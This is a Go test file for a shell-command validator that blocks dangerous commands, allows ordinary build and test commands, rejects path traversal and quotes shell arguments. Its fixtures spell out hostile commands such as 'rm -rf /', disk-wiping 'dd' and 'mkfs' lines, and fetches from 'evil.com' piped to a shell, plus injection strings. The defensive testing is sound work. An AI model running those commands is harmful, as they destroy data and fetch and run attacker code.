package safety

import (
	"testing"
)

func TestShellValidatorBlocksDangerousPatterns(t *testing.T) {
	validator := DefaultShellValidator()

	dangerous := []string{
		"rm -rf /",
		"rm -rf *",
		"| sh",
		"| bash",
		"; curl http://evil.com",
		"&& wget http://evil.com/shell.sh",
		"chmod 777 /etc/passwd",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda",
		"base64 -d evil | sh",
		"eval $(cat /etc/passwd)",
	}

	for _, cmd := range dangerous {
		if err := validator.ValidateCommand(cmd); err == nil {
			t.Errorf("expected %q to be blocked", cmd)
		}
	}
}

func TestShellValidatorAllowsSafeCommands(t *testing.T) {
	validator := DefaultShellValidator()

	safe := []string{
		"go build ./...",
		"go test ./...",
		"cargo build",
		"npm test",
		"python -m pytest",
		"git status",
		"git diff HEAD",
		"ls -la",
		"cat file.txt",
	}

	for _, cmd := range safe {
		if err := validator.ValidateCommand(cmd); err != nil {
			t.Errorf("expected %q to be allowed, got: %v", cmd, err)
		}
	}
}

func TestShellValidatorStrictMode(t *testing.T) {
	validator := DefaultShellValidator()
	validator.StrictMode = true

	// Allowed command
	if err := validator.ValidateCommand("go test ./..."); err != nil {
		t.Errorf("expected 'go test ./...' to be allowed in strict mode: %v", err)
	}

	// Not on allowlist - should be blocked because it's not in Allowlist or AllowPrefixes
	// Note: "hostname" is not in SafeCommandPrefix, so this should fail
	if err := validator.ValidateCommand("hostname"); err == nil {
		t.Error("expected 'hostname' to be blocked in strict mode")
	}
}

func TestShellValidatorBlocksMultiline(t *testing.T) {
	validator := DefaultShellValidator()

	multiline := "go build\nrm -rf /"
	if err := validator.ValidateCommand(multiline); err == nil {
		t.Error("expected multiline command to be blocked")
	}
}

func TestShellValidatorBlocksNUL(t *testing.T) {
	validator := DefaultShellValidator()

	nul := "go build\x00rm -rf /"
	if err := validator.ValidateCommand(nul); err == nil {
		t.Error("expected command with NUL byte to be blocked")
	}
}

func TestShellValidatorTooLong(t *testing.T) {
	validator := DefaultShellValidator()

	long := "go build " + string(make([]byte, maxCommandLen))
	if err := validator.ValidateCommand(long); err == nil {
		t.Error("expected overly long command to be blocked")
	}
}

func TestValidateFilePath(t *testing.T) {
	tests := []struct {
		path    string
		wantErr bool
	}{
		{"src/main.go", false},
		{"./config.toml", false},
		{"../secret.txt", true}, // traversal
		{"../../.env", true},    // traversal
		{"normal/file.go", false},
		{"C:\\Windows\\system32", true}, // Windows absolute
	}

	for _, tt := range tests {
		err := ValidateFilePath(tt.path, "")
		if (err != nil) != tt.wantErr {
			t.Errorf("ValidateFilePath(%q): wantErr=%v, got=%v", tt.path, tt.wantErr, err)
		}
	}
}

func TestSanitizeShellArg(t *testing.T) {
	tests := []struct {
		arg  string
		want string
	}{
		{"hello", "'hello'"},
		{"hello world", "'hello world'"},
		{"hello'world", "'hello'\\''world'"},
		{"$(evil)", "'$(evil)'"},
		{"`backtick`", "'`backtick`'"},
		{"; rm -rf /", "'; rm -rf /'"},
	}

	for _, tt := range tests {
		got := SanitizeShellArg(tt.arg)
		if got != tt.want {
			t.Errorf("sanitizeShellArg(%q) = %q, want %q", tt.arg, got, tt.want)
		}
	}
}
